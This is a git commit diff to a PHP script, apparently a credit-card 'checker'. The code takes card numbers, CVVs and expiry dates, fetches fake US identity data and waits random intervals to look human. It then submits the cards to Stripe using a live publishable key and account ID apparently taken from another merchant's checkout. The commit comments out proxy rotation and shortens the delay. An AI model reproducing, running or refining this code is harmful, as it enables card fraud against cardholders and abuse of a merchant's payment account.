fd37241bce847bd0a14d98d76996e75e551384fc
subaharahak <subaharahak@gmail.com>
2025-08-15 08:19:49 +0530

    Update api.php

--- login/api.php
+++ login/api.php
@@ -87,8 +87,8 @@ $number4 = substr($cc, 12, 4);
 $number6 = substr($cc, 0, 6);
 
 // Fetch random user data with delay
-$proxy = rebootproxys();
-list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
+//$proxy = rebootproxys();
+//list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -153,7 +153,7 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 
 // Insert simulated delay before posting form data
- sleep(rand(2, 4)); // A longer delay to simulate a pause before submission
+ sleep(rand(1, 3)); // A longer delay to simulate a pause before submission
 
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=152936c2-270c-42fc-8b9b-419d347c8a677f80b9&muid=02cd223f-04ec-4dfa-a540-2b81f331208f00654f&sid=b8bbc87d-975f-4c4f-9c58-9906dbd1324f3210fb&pasted_fields=number&payment_user_agent=stripe.js%2Ff52291c812%3B+stripe-js-v3%2Ff52291c812%3B+split-card-element&referrer=https%3A%2F%2Fwww.doane.us&time_on_page=222764&client_attribution_metadata[client_session_id]=6c5b71b2-d127-4258-8145-85b5c7f1c25e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_168hGFAoD6Z5UbBG');
 
@@ -717,4 +717,5 @@ echo "<b>1REQ Result:</b> $result1<br><br>";
 echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
+
 
